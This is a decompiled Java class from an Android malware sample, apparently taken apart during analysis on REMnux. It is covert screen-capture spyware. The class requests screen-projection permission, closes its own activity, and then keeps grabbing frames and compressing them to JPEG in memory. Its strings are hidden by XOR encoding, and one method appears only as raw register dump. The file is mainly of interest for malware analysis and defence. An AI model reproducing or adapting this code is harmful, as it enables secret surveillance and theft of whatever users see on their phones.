package com.zjxyxnvvp.nxvxchltf;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.util.concurrent.atomic.AtomicBoolean;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class e extends Activity {
    private static MediaProjection f;
    private static Handler g;
    private static VirtualDisplay h;
    private static ImageReader i;
    private static int j;
    private static String k;

    /* renamed from: a  reason: collision with root package name */
    private MediaProjectionManager f316a;

    /* renamed from: b  reason: collision with root package name */
    private int f317b;
    private int c;
    private int d;
    Image e;
    private static short[] $ = {7746, 7710, 7694, 7711, 7688, 7688, 7683, 7710, 7685, 7682, 7705, 7710, 7746, 7540, 7541, 7549, 7551, -23922, -23929, -23837, -23930, -23919, -23919, -23815, -23837, 29305, 29297, 29296, 29309, 29301, 29259, 29284, 29286, 29307, 29310, 29297, 29303, 29280, 29309, 29307, 29306, 25682, 25691, 25663, 25690, 25677, 25677, 25637, 25663};
    public static final AtomicBoolean l = new AtomicBoolean();
    public static final AtomicBoolean m = new AtomicBoolean();
    public static final AtomicBoolean n = new AtomicBoolean();
    public static final AtomicBoolean o = new AtomicBoolean();
    public static final AtomicBoolean p = new AtomicBoolean();
    public static ByteArrayOutputStream q = new ByteArrayOutputStream();

    /* JADX INFO: Access modifiers changed from: package-private */
    /* loaded from: /home/remnux/decompressedMalicious.dex */
    public class a extends Thread {
        a(e eVar) {
        }

        @Override // java.lang.Thread, java.lang.Runnable
        public void run() {
            Looper.prepare();
            Handler unused = e.g = new Handler();
            Looper.loop();
        }
    }

    /* loaded from: /home/remnux/decompressedMalicious.dex */
    class b implements Runnable {
        b() {
        }

        @Override // java.lang.Runnable
        public void run() {
            if (e.h != null) {
                e.h.release();
            }
            if (e.i != null) {
                e.i.setOnImageAvailableListener(null, null);
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* loaded from: /home/remnux/decompressedMalicious.dex */
    public class c implements ImageReader.OnImageAvailableListener {
        private static short[] $ = {-4812, -4803, -4821, -4775, -4804, -4821, -4821, -4797, -4775};

        private static String $(int i, int i2, int i3) {
            char[] cArr = new char[i2 - i];
            for (int i4 = 0; i4 < i2 - i; i4++) {
                cArr[i4] = (char) ($[i + i4] ^ i3);
            }
            return new String(cArr);
        }

        private c() {
        }

        /* synthetic */ c(e eVar, a aVar) {
            this();
        }

        /* JADX WARN: Removed duplicated region for block: B:26:0x0098 A[Catch: all -> 0x0090, TryCatch #0 {all -> 0x0090, blocks: (B:9:0x0077, B:11:0x007c, B:19:0x008c, B:26:0x0098, B:28:0x009d, B:29:0x00a0), top: B:32:0x0000 }] */
        /* JADX WARN: Removed duplicated region for block: B:28:0x009d A[Catch: all -> 0x0090, TryCatch #0 {all -> 0x0090, blocks: (B:9:0x0077, B:11:0x007c, B:19:0x008c, B:26:0x0098, B:28:0x009d, B:29:0x00a0), top: B:32:0x0000 }] */
        @Override // android.media.ImageReader.OnImageAvailableListener
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct add '--show-bad-code' argument
        */
        public void onImageAvailable(android.media.ImageReader r11) {
            /*
                r10 = this;
                r6 = r10
                r7 = r11
                r7 = 0
                android.media.ImageReader r0 = com.zjxyxnvvp.nxvxchltf.e.c()     // Catch: Exception -> 0x0085, all -> 0x0082
                android.media.Image r0 = r0.acquireLatestImage()     // Catch: Exception -> 0x0085, all -> 0x0082
                java.util.concurrent.atomic.AtomicBoolean r1 = com.zjxyxnvvp.nxvxchltf.e.p     // Catch: Exception -> 0x0080, all -> 0x0095
                boolean r1 = r1.get()     // Catch: Exception -> 0x0080, all -> 0x0095
                if (r1 != 0) goto L_0x0075
                if (r0 == 0) goto L_0x0075
                com.zjxyxnvvp.nxvxchltf.e r1 = com.zjxyxnvvp.nxvxchltf.e.this     // Catch: Exception -> 0x0080, all -> 0x0095
                r1.e = r0     // Catch: Exception -> 0x0080, all -> 0x0095
                android.media.Image$Plane[] r1 = r0.getPlanes()     // Catch: Exception -> 0x0080, all -> 0x0095
                r2 = 0
                r3 = r1[r2]     // Catch: Exception -> 0x0080, all -> 0x0095
                java.nio.ByteBuffer r3 = r3.getBuffer()     // Catch: Exception -> 0x0080, all -> 0x0095
                r4 = r1[r2]     // Catch: Exception -> 0x0080, all -> 0x0095
                int r4 = r4.getPixelStride()     // Catch: Exception -> 0x0080, all -> 0x0095
                r1 = r1[r2]     // Catch: Exception -> 0x0080, all -> 0x0095
                int r1 = r1.getRowStride()     // Catch: Exception -> 0x0080, all -> 0x0095
                com.zjxyxnvvp.nxvxchltf.e r2 = com.zjxyxnvvp.nxvxchltf.e.this     // Catch: Exception -> 0x0080, all -> 0x0095
                int r2 = com.zjxyxnvvp.nxvxchltf.e.d(r2)     // Catch: Exception -> 0x0080, all -> 0x0095
                int r2 = r2 * r4
                int r1 = r1 - r2
                com.zjxyxnvvp.nxvxchltf.e r2 = com.zjxyxnvvp.nxvxchltf.e.this     // Catch: Exception -> 0x0080, all -> 0x0095
                int r2 = com.zjxyxnvvp.nxvxchltf.e.d(r2)     // Catch: Exception -> 0x0080, all -> 0x0095
                int r1 = r1 / r4
                int r2 = r2 + r1
                com.zjxyxnvvp.nxvxchltf.e r1 = com.zjxyxnvvp.nxvxchltf.e.this     // Catch: Exception -> 0x0080, all -> 0x0095
                int r1 = com.zjxyxnvvp.nxvxchltf.e.e(r1)     // Catch: Exception -> 0x0080, all -> 0x0095
                android.graphics.Bitmap$Config r4 = android.graphics.Bitmap.Config.ARGB_8888     // Catch: Exception -> 0x0080, all -> 0x0095
                android.graphics.Bitmap r7 = android.graphics.Bitmap.createBitmap(r2, r1, r4)     // Catch: Exception -> 0x0080, all -> 0x0095
                r7.copyPixelsFromBuffer(r3)     // Catch: Exception -> 0x0080, all -> 0x0095
                r1 = 250(0xfa, float:3.5E-43)
                r2 = 550(0x226, float:7.71E-43)
                r3 = 1
                android.graphics.Bitmap r1 = android.graphics.Bitmap.createScaledBitmap(r7, r1, r2, r3)     // Catch: Exception -> 0x0080, all -> 0x0095
                java.io.ByteArrayOutputStream r2 = new java.io.ByteArrayOutputStream     // Catch: Exception -> 0x0080, all -> 0x0095
                r2.<init>()     // Catch: Exception -> 0x0080, all -> 0x0095
                com.zjxyxnvvp.nxvxchltf.e.q = r2     // Catch: Exception -> 0x0080, all -> 0x0095
                r2.reset()     // Catch: Exception -> 0x0080, all -> 0x0095
                android.graphics.Bitmap$CompressFormat r2 = android.graphics.Bitmap.CompressFormat.JPEG     // Catch: Exception -> 0x0080, all -> 0x0095
                r4 = 30
                java.io.ByteArrayOutputStream r5 = com.zjxyxnvvp.nxvxchltf.e.q     // Catch: Exception -> 0x0080, all -> 0x0095
                r1.compress(r2, r4, r5)     // Catch: Exception -> 0x0080, all -> 0x0095
                com.zjxyxnvvp.nxvxchltf.e.f()     // Catch: Exception -> 0x0080, all -> 0x0095
                java.util.concurrent.atomic.AtomicBoolean r1 = com.zjxyxnvvp.nxvxchltf.e.p     // Catch: Exception -> 0x0080, all -> 0x0095
                r1.set(r3)     // Catch: Exception -> 0x0080, all -> 0x0095
            L_0x0075:
                if (r7 == 0) goto L_0x007a
                r7.recycle()     // Catch: all -> 0x0090
            L_0x007a:
                if (r0 == 0) goto L_0x00c7
            L_0x007c:
                r0.close()     // Catch: all -> 0x0090
                goto L_0x00c7
            L_0x0080:
                r1 = move-exception
                goto L_0x0087
            L_0x0082:
                r1 = move-exception
                r0 = r7
                goto L_0x0096
            L_0x0085:
                r1 = move-exception
                r0 = r7
            L_0x0087:
                r1.printStackTrace()     // Catch: all -> 0x0095
                if (r7 == 0) goto L_0x0092
                r7.recycle()     // Catch: all -> 0x0090
                goto L_0x0092
            L_0x0090:
                r7 = move-exception
                goto L_0x00a1
            L_0x0092:
                if (r0 == 0) goto L_0x00c7
                goto L_0x007c
            L_0x0095:
                r1 = move-exception
            L_0x0096:
                if (r7 == 0) goto L_0x009b
                r7.recycle()     // Catch: all -> 0x0090
            L_0x009b:
                if (r0 == 0) goto L_0x00a0
                r0.close()     // Catch: all -> 0x0090
            L_0x00a0:
                throw r1     // Catch: all -> 0x0090
            L_0x00a1:
                r7.printStackTrace()
                java.lang.StringBuilder r0 = new java.lang.StringBuilder
                r0.<init>()
                r9 = 0
                r10 = 9
                r11 = -4743(0xffffffffffffed79, float:NaN)
                java.lang.String r1 = $(r9, r10, r11)
                r0.append(r1)
                java.lang.String r7 = r7.getMessage()
                r0.append(r7)
                java.lang.String r7 = r0.toString()
                com.zjxyxnvvp.nxvxchltf.util.e.a(r7)
            L_0x00c7:
                return
            */
            throw new UnsupportedOperationException("Method not decompiled: com.zjxyxnvvp.nxvxchltf.e.c.onImageAvailable(android.media.ImageReader):void");
        }
    }

    /* loaded from: /home/remnux/decompressedMalicious.dex */
    private class d extends MediaProjection.Callback {

        /* loaded from: /home/remnux/decompressedMalicious.dex */
        class a implements Runnable {
            a(d dVar) {
            }

            @Override // java.lang.Runnable
            public void run() {
                if (e.h != null) {
                    e.h.release();
                }
                if (e.i != null) {
                    e.i.setOnImageAvailableListener(null, null);
                }
            }
        }

        private d(e eVar) {
        }

        /* synthetic */ d(e eVar, a aVar) {
            this(eVar);
        }

        @Override // android.media.projection.MediaProjection.Callback
        public void onStop() {
            e.g.post(new a(this));
            e.o.set(false);
        }
    }

    private static String $(int i2, int i3, int i4) {
        char[] cArr = new char[i3 - i2];
        for (int i5 = 0; i5 < i3 - i2; i5++) {
            cArr[i5] = (char) ($[i2 + i5] ^ i4);
        }
        return new String(cArr);
    }

    static /* synthetic */ int f() {
        int i2 = j;
        j = i2 + 1;
        return i2;
    }

    private void h() {
        File externalFilesDir;
        if (f != null && (externalFilesDir = getExternalFilesDir(null)) != null) {
            k = externalFilesDir.getAbsolutePath() + $(0, 13, 7789);
            File file = new File(k);
            if (file.exists() || !file.mkdirs()) {
            }
        }
    }

    @SuppressLint({"WrongConstant"})
    private void i() {
        DisplayMetrics displayMetrics = getResources().getDisplayMetrics();
        this.f317b = displayMetrics.densityDpi;
        int i2 = displayMetrics.widthPixels;
        this.c = i2;
        int i3 = displayMetrics.heightPixels;
        this.d = i3;
        ImageReader newInstance = ImageReader.newInstance(i2, i3, 1, 2);
        i = newInstance;
        h = f.createVirtualDisplay($(13, 17, 7472), this.c, this.d, this.f317b, 16, newInstance.getSurface(), null, g);
        i.setOnImageAvailableListener(new c(this, null), g);
        o.set(true);
    }

    private void j() {
        startActivityForResult(this.f316a.createScreenCaptureIntent(), 1);
    }

    public static void k() {
        MediaProjection mediaProjection = f;
        if (mediaProjection != null) {
            mediaProjection.stop();
        }
        g.post(new b());
    }

    @Override // android.app.Activity
    public void onActivityResult(int i2, int i3, Intent intent) {
        if (i2 == 1 && i3 == -1) {
            try {
                f = this.f316a.getMediaProjection(i3, intent);
                h();
                i();
                f.registerCallback(new d(this, null), g);
                finish();
            } catch (Throwable th) {
                th.printStackTrace();
                com.zjxyxnvvp.nxvxchltf.util.e.a($(17, 25, -23869) + th.getMessage());
            }
        }
    }

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        try {
            this.f316a = (MediaProjectionManager) getSystemService($(25, 41, 29204));
            j();
            new a(this).start();
        } catch (Throwable th) {
            th.printStackTrace();
            com.zjxyxnvvp.nxvxchltf.util.e.a($(41, 49, 25631) + th.getMessage());
        }
    }

    @Override // android.app.Activity
    protected void onPause() {
        super.onPause();
        finish();
    }
}
